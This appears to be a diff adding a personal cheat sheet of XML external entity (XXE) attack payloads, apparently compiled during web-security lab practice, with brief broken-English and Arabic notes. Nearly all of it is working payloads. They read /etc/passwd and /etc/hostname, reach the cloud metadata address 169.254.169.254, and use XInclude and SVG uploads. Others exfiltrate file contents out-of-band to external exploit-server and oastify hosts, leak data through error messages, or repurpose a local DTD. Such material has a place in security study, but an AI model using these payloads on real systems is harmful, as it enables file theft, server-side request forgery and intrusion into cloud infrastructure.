@@ -1,0 +1,47 @@
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+in pramter post blind
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+bind
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://x1zcwds8ebls4f92wobnxzkr4ia9yzmo.oastify.com"> ]>
+<!DOCTYPE xxe [<!ENTITY % xxe SYSTEM "http://uomzowizpnxyqt4vcb18qhnudljc72vr.oastify.com"> %xxe; ]>
+
+get info from blind
+Craft a response
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a8c004503427a0982e13cb401770063.exploit-server.net/?x=%file;'>">
+%eval;
+%exfil;
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a8c004503427a0982e13cb401770063.exploit-server.net/exploit"> %xxe;]>
+
+give info of messeg error
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a0a000103d7171180db7f97012300e8.exploit-server.net/exploit"> 
+
+استغلال محلي 
+file:///usr/share/yelp/dtd/docbookx.dtd this maybay do not work 
+but in github we have list of path dircotry
+
+
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+
+
+
+
+
+
